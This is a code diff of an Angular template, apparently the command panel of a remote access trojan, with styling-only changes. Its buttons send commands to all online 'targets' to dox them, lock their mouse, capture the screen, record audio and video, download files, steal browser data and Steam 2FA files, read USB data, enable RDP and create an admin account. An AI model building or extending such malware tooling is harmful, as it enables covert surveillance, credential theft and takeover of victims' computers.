@@ -1,9 +1,9 @@
 <mat-card class="commandBtnsAll">
-  <h1 class="title">RUN ON ALL ONLINE TARGETS</h1>
-  <div>
+  <h1 class="title"> Run on all online targets</h1>
+  <div class="commands">
     <button mat-button color="accent" (click)="sendCommandToAllOnlineTargets('dox')">Dox</button>
   </div>
-  <div>
+  <div class="commands">
     <form [formGroup]="mouseFormAll">
       <button mat-button [disabled]="!mouseFormAll.valid" color="accent"
         (click)="sendCommandToAllOnlineTargets('mouse', concatTime(mouseFormAll))">Mouse Lock</button>
@@ -22,10 +22,10 @@
       </mat-form-field>
     </form>
   </div>
-  <div>
+  <div class="commands">
     <button mat-button color="accent" (click)="sendCommandToAllOnlineTargets('screen')">Screen</button>
   </div>
-  <div>
+  <div class="commands">
     <form [formGroup]="downloadFormAll">
       <button mat-button [disabled]="!downloadFormAll.valid" color="accent"
         (click)="sendCommandToAllOnlineTargets('download', getPath(downloadFormAll))">Download</button>
@@ -36,7 +36,7 @@
       </mat-form-field>
     </form>
   </div>
-  <div>
+  <div class="commands">
     <form [formGroup]="recordFormAll">
       <button mat-button [disabled]="!recordFormAll.valid" color="accent"
         (click)="sendCommandToAllOnlineTargets('record', concatTime(recordFormAll))">Record</button>
@@ -55,11 +55,11 @@
       </mat-form-field>
     </form>
   </div>
-  <div>
+  <div class="commands">
     <button mat-button color="accent" (click)="sendCommandToAllOnlineTargets('getSteam2fa')">Get Steam 2FA
       Files</button>
   </div>
-  <div>
+  <div class="commands">
     <form [formGroup]="videoRecordFormAll">
       <button mat-button [disabled]="!videoRecordFormAll.valid" color="accent"
         (click)="sendCommandToAllOnlineTargets('videoRecord', concatTime(videoRecordFormAll))">Video Record</button>
@@ -78,19 +78,19 @@
       </mat-form-field>
     </form>
   </div>
-  <div>
+  <div class="commands">
     <button mat-button color="accent"
       (click)="sendCommandToAllOnlineTargets('getBrowserData')">Get Browser Data</button>
   </div>
-  <div>
+  <div class="commands">
     <button mat-button color="accent"
       (click)="sendCommandToAllOnlineTargets('getUSBData')">Get USB Data</button>
   </div>
-  <div>
+  <div class="commands">
     <button mat-button color="accent"
       (click)="sendCommandToAllOnlineTargets('rdpEnable')">Enable RDP</button>
   </div>
-  <div>
+  <div class="commands">
     <button mat-button color="accent"
       (click)="sendCommandToAllOnlineTargets('createAdminUser')">Create Admin User</button>
   </div>
